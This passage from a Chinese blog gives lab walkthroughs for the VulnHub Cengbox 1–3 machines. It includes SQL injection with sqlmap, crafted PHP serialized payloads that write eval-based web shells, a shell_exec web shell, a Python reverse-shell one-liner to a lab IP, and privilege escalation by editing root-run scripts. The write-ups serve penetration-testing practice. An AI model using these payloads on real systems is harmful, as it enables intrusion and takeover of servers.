title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101120506.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101132020.png\" alt=\"\"></p>\n<p>其他几个没啥，masteradmin提示forbidden，猜想可能是个目录，加上继续扫</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101132151.png\" alt=\"\"></p>\n<h3 id=\"sql注入得到管理员密码\"><a href=\"#sql注入得到管理员密码\" class=\"headerlink\" title=\"sql注入得到管理员密码\"></a>sql注入得到管理员密码</h3><p>一个登录和上传页面，上传页面需要登录才能打开</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101132303.png\" alt=\"\"></p>\n<p>老规矩抓包弱密码万能密码sql注入一套走，回首一看xray扫到了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101132719.png\" alt=\"\"></p>\n<p>那么sqlmap一把梭</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101142024107.png\" alt=\"image-20210101142024107\"></p>\n<p>登录跳转到上传页面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101142140919.png\" alt=\"image-20210101142140919\"></p>\n<h3 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h3><p>上传文件类型必须是CENG</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101142752511.png\" alt=\"image-20210101142752511\"></p>\n<p>该后缀访问上传文件，试了下居然直接解析了？（人间疑惑）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101163300.png\" alt=\"\"></p>\n<p>查看home目录得知有个cengover用户</p>\n<p>masteradmin目录下找到数据库文件，得到数据库用户名密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210101163236.png\" alt=\"\"></p>\n<p>尝试连接数据库失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101145858921.png\" alt=\"image-20210101145858921\"></p>\n<p>想到cengover用户会不会用的是登录页面一样的密码，尝试ssh连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101150234186.png\" alt=\"image-20210101150234186\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>user.txt貌似是一串md5没撞出来</p>\n<p>找下特权文件，无果，查看定时任务无果，查看端口监听无果</p>\n<p>/var/opt目录下找到md5check.py</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101151224495.png\" alt=\"image-20210101151224495\"></p>\n<p>通过对比文件md5校验值判断/etc/passwd是否被修改，并将记录写入root下的note和warning文件，那么可以知道这个脚本必定是添加到了定时任务的</p>\n<p>并且这个文件是用户可写的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101153956748.png\" alt=\"image-20210101153956748\"></p>\n<p>上传pspy查看进程变化，发现确实是自动执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101153822247.png\" alt=\"image-20210101153822247\"></p>\n<p>那么直接修改文件内容反弹shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101160246798.png\" alt=\"image-20210101160246798\"></p>\n<p>完成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210101160215750.png\" alt=\"image-20210101160215750\"></p>\n<h2 id=\"Cengbox2\"><a href=\"#Cengbox2\" class=\"headerlink\" title=\"Cengbox2\"></a>Cengbox2</h2><h3 id=\"信息搜集-1\"><a href=\"#信息搜集-1\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-01 21:08 EST</span><br><span class=\"line\">Nmap scan report for 192.168.93.133</span><br><span class=\"line\">Host is up (0.00039s latency).</span><br><span class=\"line\">Not shown: 997 closed ports</span><br><span class=\"line\">PORT   STATE SERVICE VERSION</span><br><span class=\"line\">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class=\"line\">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class=\"line\">|_-rw-r--r--    1 0        0             209 May 23  2020 note.txt</span><br><span class=\"line\">| ftp-syst: </span><br><span class=\"line\">|   STAT: </span><br><span class=\"line\">| FTP server status:</span><br><span class=\"line\">|      Connected to ::ffff:192.168.93.131</span><br><span class=\"line\">|      Logged in as ftp</span><br><span class=\"line\">|      TYPE: ASCII</span><br><span class=\"line\">|      No session bandwidth limit</span><br><span class=\"line\">|      Session timeout in seconds is 300</span><br><span class=\"line\">|      Control connection is plain text</span><br><span class=\"line\">|      Data connections will be plain text</span><br><span class=\"line\">|      At session startup, client count was 1</span><br><span class=\"line\">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class=\"line\">|_End of status</span><br><span class=\"line\">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   2048 c4:99:9d:e0:bc:07:3c:4f:53:e5:bc:27:35:80:e4:9e (RSA)</span><br><span class=\"line\">|   256 fe:60:a1:10:90:98:8e:b0:82:02:3b:40:bc:df:66:f1 (ECDSA)</span><br><span class=\"line\">|_  256 3a:c3:a0:e7:bd:20:ca:1e:71:d4:3c:12:23:af:6a:c3 (ED25519)</span><br><span class=\"line\">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class=\"line\">|_http-title: Site Maintenance</span><br><span class=\"line\">MAC Address: 00:0C:29:F7:F0:CE (VMware)</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running: Linux 3.X|4.X</span><br><span class=\"line\">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class=\"line\">OS details: Linux 3.2 - 4.9</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE</span><br><span class=\"line\">HOP RTT     ADDRESS</span><br><span class=\"line\">1   0.39 ms 192.168.93.133</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds</span><br></pre></td></tr></table></figure>\n\n<p>可以看到ftp用户可以登录，目录下有个note,txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102114510.png\" alt=\"\"></p>\n<p>下载查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102114557.png\" alt=\"\"></p>\n<p>说是部署了面板并且用的是默认密码，可能可以登录，访问web服务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102114742.png\" alt=\"\"></p>\n<p>扫目录没啥发现，回头再看看note，第二段说把网站移到了一个新的域名ceng-company.vm，重定向?，修改hosts文件试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102115927.png\" alt=\"\"></p>\n<p>看看有没啥变化</p>\n<p>web服务依旧没变，目录也还是啥都没有，但注意到ceng-comany.vm是一级域名，那会不会有子域名呢</p>\n<p>用subDomainsBrute跑一跑，也要再修改一下host，但是hosts文件不支持通配符，就只能挨个试了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102123635.png\" alt=\"\"></p>\n<p>结果admin提示403，感觉有戏，目录扫一波，还是啥都没有，换个dirbuster的字典，终于扫到个gila</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102130102.png\" alt=\"\"></p>\n<h3 id=\"后台getshell\"><a href=\"#后台getshell\" class=\"headerlink\" title=\"后台getshell\"></a>后台getshell</h3><p>访问是个cms</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102130036.png\" alt=\"\"></p>\n<p>admin直接跳转到后台，需要管理员邮箱和密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102131822.png\" alt=\"\"></p>\n<p>之前说是用了默认密码，github看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102132158.png\" alt=\"\"></p>\n<p>登录失败，试试加上note.txt的人名<a href=\"mailto:Kevin@mail.com\">Kevin@mail.com</a>，还是失败，偷瞄wp，好吧道行不够</p>\n<p><a href=\"mailto:Kevin@ceng-company.vm\">Kevin@ceng-company.vm</a>|admin成功登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102132811.png\" alt=\"\"></p>\n<p>得知版本号是1.10.9，搜下版本有没啥漏洞</p>\n<p>有个目录遍历</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102133335.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102133550.png\" alt=\"\"></p>\n<p>注意到这里有个上传功能，那么生成木马上传尝试getshell</p>\n<p>主目录上传没动静，themes目录上传成功但访问不了，src目录可以访问</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102143439.png\" alt=\"\"></p>\n<p>但403</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102143457.png\" alt=\"\"></p>\n<p>猜测是.htaccess做了限制</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102143530.png\" alt=\"\"></p>\n<p>改下就成，连接shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102143633.png\" alt=\"\"></p>\n<h3 id=\"提权-1\"><a href=\"#提权-1\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>home目录下有两个用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102143722.png\" alt=\"\"></p>\n<p>查看sudo权限，swartz用户可以运行runphp.sh</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102144132.png\" alt=\"\"></p>\n<p>查看内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102144323.png\" alt=\"\"></p>\n<p>那好办，直接运行然后system获取swartz的shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102144646.png\" alt=\"\"></p>\n<p>好吧这个weevely的temainal不行，弹到其他地方试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102150420.png\" alt=\"\"></p>\n<p>继续找突破口，发现能进入mitnick用户家目录，目录下有个user.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102150920.png\" alt=\"\"></p>\n<p>但是没有权限查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102151048.png\" alt=\"\"></p>\n<h3 id=\"爆破id-rsa登录ssh\"><a href=\"#爆破id-rsa登录ssh\" class=\"headerlink\" title=\"爆破id_rsa登录ssh\"></a>爆破id_rsa登录ssh</h3><p>同目录下有ssh</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102151231.png\" alt=\"\"></p>\n<p>把id_rsa传到本机试着用john破解ssh密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102153626.png\" alt=\"\"></p>\n<p>得到密码legend</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102153653.png\" alt=\"\"></p>\n<p>利用id_rsa登录，提示文件权限太大</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102153751.png\" alt=\"\"></p>\n<p>chmod修改文件权限再登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102153822.png\" alt=\"\"></p>\n<p>查看user.txt，一串字符串不知道有啥用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102153958.png\" alt=\"\"></p>\n<h3 id=\"用户组内可写文件提权\"><a href=\"#用户组内可写文件提权\" class=\"headerlink\" title=\"用户组内可写文件提权\"></a>用户组内可写文件提权</h3><p>查看特权文件无果，学到个新招查看用户组内可写文件，这里也就是developers组内可写文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -type f -perm -g+rwx 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102155406.png\" alt=\"\"></p>\n<p>update-motd.d目录下存放的是登录信息文件，在每次ssh登录时自动执行，这里可以看到他们都是root权限，组内用户可写</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102155723.png\" alt=\"\"></p>\n<p>那么修改一个文件往里面添加一个bash命令即可</p>\n<p>这里选择给find命令加上特权，这样下次ssh登录时，find命令就会带有root权限，从而可以本地利用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102160746.png\" alt=\"\"></p>\n<p>重新登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102160923.png\" alt=\"\"></p>\n<p>find特权命令提权</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102161252.png\" alt=\"\"></p>\n<p>嗯。。。但是并没有root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102161625.png\" alt=\"\"></p>\n<p>挺神奇的是运行大佬wp的命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -exec &#x2F;bin&#x2F;bash -p \\;</span><br></pre></td></tr></table></figure>\n\n<p>又有了root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/image-20210102161606633.png\" alt=\"image-20210102161606633\"></p>\n<p>嗯神奇的-p参数，以后得注意下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210102162601.png\" alt=\"\"></p>\n<p>完成</p>\n<h2 id=\"Cengbox3\"><a href=\"#Cengbox3\" class=\"headerlink\" title=\"Cengbox3\"></a>Cengbox3</h2><h3 id=\"信息搜集-2\"><a href=\"#信息搜集-2\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-02 20:52 EST</span><br><span class=\"line\">Nmap scan report for 192.168.93.134</span><br><span class=\"line\">Host is up (0.00037s latency).</span><br><span class=\"line\">Not shown: 997 filtered ports</span><br><span class=\"line\">PORT    STATE  SERVICE  VERSION</span><br><span class=\"line\">22&#x2F;tcp  closed ssh</span><br><span class=\"line\">80&#x2F;tcp  open   http     Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class=\"line\">|_http-title: Agency</span><br><span class=\"line\">443&#x2F;tcp open   ssl&#x2F;http Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class=\"line\">|_http-title: Agency</span><br><span class=\"line\">| ssl-cert: Subject: commonName&#x3D;ceng-company.vm&#x2F;organizationName&#x3D;Ceng Company&#x2F;stateOrProvinceName&#x3D;\\xC3\\x84Istanbul&#x2F;countryName&#x3D;TR</span><br><span class=\"line\">| Not valid before: 2020-09-24T14:25:07</span><br><span class=\"line\">|_Not valid after:  2021-09-24T14:25:07</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http&#x2F;1.1</span><br><span class=\"line\">MAC Address: 00:0C:29:20:D8:B7 (VMware)</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running: Linux 3.X|4.X</span><br><span class=\"line\">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class=\"line\">OS details: Linux 3.10 - 4.11</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE</span><br><span class=\"line\">HOP RTT     ADDRESS</span><br><span class=\"line\">1   0.37 ms 192.168.93.134</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 33.99 seconds</span><br></pre></td></tr></table></figure>\n\n<p>还是要hosts文件绑定一下ceng-company.vm</p>\n<p>访问web服务一套模板但是啥都没有</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103105418.png\" alt=\"\"></p>\n<p>瞄了眼wp又是绑定了子域名，dev.ceng-company.vm</p>\n<h3 id=\"sql注入后台登录\"><a href=\"#sql注入后台登录\" class=\"headerlink\" title=\"sql注入后台登录\"></a>sql注入后台登录</h3><p>访问是个登录框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103105842.png\" alt=\"\"></p>\n<p>xray扫出注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103110123.png\" alt=\"\"></p>\n<p>抓包sqlmap一把梭</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103115940.png\" alt=\"\"></p>\n<h3 id=\"php对象注入getshell\"><a href=\"#php对象注入getshell\" class=\"headerlink\" title=\"php对象注入getshell\"></a>php对象注入getshell</h3><p>登录后台有个add poem的功能</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103120230.png\" alt=\"\"></p>\n<p>随便提交一个可以观察到url</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aaa&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;poem.txt&quot;;s:8:&quot;poemName&quot;;s:3:&quot;aaa&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aaa&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过字符串里的路径我们知道，生成的文件是存在于网站根目录里的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103121702.png\" alt=\"\"></p>\n<p>参数都可控，并且序列化字符串反序列化之后直接写入到了目标文件，那么直接构造即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:23:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;;s:8:&quot;poemName&quot;;s:40:&quot;&lt;?php echo(&#39;shell is fine&#39;);phpinfo();?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103121544.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103121604.png\" alt=\"\"></p>\n<p>重新传个连接木马连上getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;ada&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:24:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell1.php&quot;;s:8:&quot;poemName&quot;;s:48:&quot;&lt;?php echo(&#39;shell is fine&#39;);eval($_POST[&#39;a&#39;]);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;ada&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103124150.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103130106.png\" alt=\"\"></p>\n<h3 id=\"监听本地流量获取ssh密码\"><a href=\"#监听本地流量获取ssh密码\" class=\"headerlink\" title=\"监听本地流量获取ssh密码\"></a>监听本地流量获取ssh密码</h3><p>只有个eric用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103130036.png\" alt=\"\"></p>\n<p>pspy64查看发现定时执行/opt目录下的login.py</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103131747.png\" alt=\"\"></p>\n<p>查看文件是否可写</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103131901.png\" alt=\"\"></p>\n<p>啥权限都没，不过发现了另外两个文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103132026.png\" alt=\"\"></p>\n<p>暂时没啥用</p>\n<p>看wp又学到了小技巧，之前已经知道login.py会定时执行，那么必定存在登录的过程从而产生登录流量，那么我们可以抓取本地流量从而获取login.py中用来登录的密码</p>\n<p>目标主机已经装了tcpdump</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103132727.png\" alt=\"\"></p>\n<p>在tmp可写目录监听流量保存为文件，等待1-2分钟</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tcpdump -i lo -w login.pcapng</span><br></pre></td></tr></table></figure>\n\n<p>找到密码<code>3ricThompson*Covid19</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103133503.png\" alt=\"\"></p>\n<h3 id=\"提权-2\"><a href=\"#提权-2\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>ssh连接不行，但是可以切换用户，好吧这也不行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103135334.png\" alt=\"\"></p>\n<p>补充一个<a href=\"https://stackoom.com/question/2V0zC/Docker%E4%B8%AD%E7%9A%84-su-%E5%91%BD%E4%BB%A4%E8%BF%94%E5%9B%9E-%E5%BF%85%E9%A1%BB%E4%BB%8E%E7%BB%88%E7%AB%AF%E8%BF%90%E8%A1%8C\" target=\"_blank\" rel=\"noopener\">小知识</a>，当我们通过php或者python获取shell时，会话是没有分配一个pty的，因此我们需要创建一个pty</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103135349.png\" alt=\"\"></p>\n<p>那么寻找提权</p>\n<p>sudo组免密执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103141340.png\" alt=\"\"></p>\n<p>check.sh和whatsmyip.py都不能修改</p>\n<p>但login.py我们是可以修改，并且之前已经了解了是root权限的自动执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103131747.png\" alt=\"\"></p>\n<p>那么直接修改login.py反弹一个shell即可，但这里有点问题，之前获取的shell无法用nano或者vim准确的修改文件，且极易退出shell</p>\n<p>因此这里又学到一个小技巧</p>\n<p>先利用下列php获取shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php echo shell_exec($_GET[&#39;e&#39;].&#39; 2&gt;&amp;1&#39;); ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这样可以直接执行e传入的命令，利用下列payload连接shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.93.129&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>\n\n<p>在shell内输入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">export TERM&#x3D;xterm</span><br></pre></td></tr></table></figure>\n\n<p>ctrl+z暂时退出</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103165357.png\" alt=\"\"></p>\n<p>执行stty -a查看当前终端尺寸，并复制下来备用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">stty rows 40 columns 157</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103165502.png\" alt=\"\"></p>\n<p>执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">stty raw -echo;fg</span><br></pre></td></tr></table></figure>\n\n<p>继续连接了刚才的shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103165611.png\" alt=\"\"></p>\n<p>输入reset重置窗口，再输入刚才复制的<code>stty rows 40 columns 157</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103165705.png\" alt=\"\"></p>\n<p>这样就可以方便的用nano或者vim编辑文件，而且不会习惯性的ctrl+z就会退出shell了</p>\n<p>将payload用nano编译保存，等待login.py执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103170204.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103170511.png\" alt=\"\"></p>\n<p>成功反弹shell并且是root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210103170541.png\" alt=\"\"></p>\n<p>完成</p>\n","categories":["vulnhub"]},{"title":"vulnhub——DMV","url":"/2020/12/23/vulnhub_DMV/","content":"<h2 id=\"DMV-1\"><a href=\"#DMV-1\" class=\"headerlink\" title=\"DMV-1\"></a>DMV-1</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-09 03:04 EST</span><br><span class=\"line\">Nmap scan report for 192.168.93.135</span><br><span class=\"line\">Host is up (0.00043s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT   STATE SERVICE VERSION</span><br><span class=\"line\">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)</span><br><span class=\"line\">|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)</span><br><span class=\"line\">|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)</span><br><span class=\"line\">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class=\"line\">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class=\"line\">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class=\"line\">MAC Address: 00:0C:29:9E:3B:DC (VMware)</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running: Linux 4.X|5.X</span><br><span class=\"line\">OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</span><br><span class=\"line\">OS details: Linux 4.15 - 5.6</span><br><span class=\"line\">Network Distance: 1 hop</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE</span><br><span class=\"line\">HOP RTT     ADDRESS</span><br><span class=\"line\">1   0.43 ms 192.168.93.135</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds</span><br></pre></td></tr></table></figure>\n\n<p>80页面貌似是个音频转换的服务</p>\n<p><img 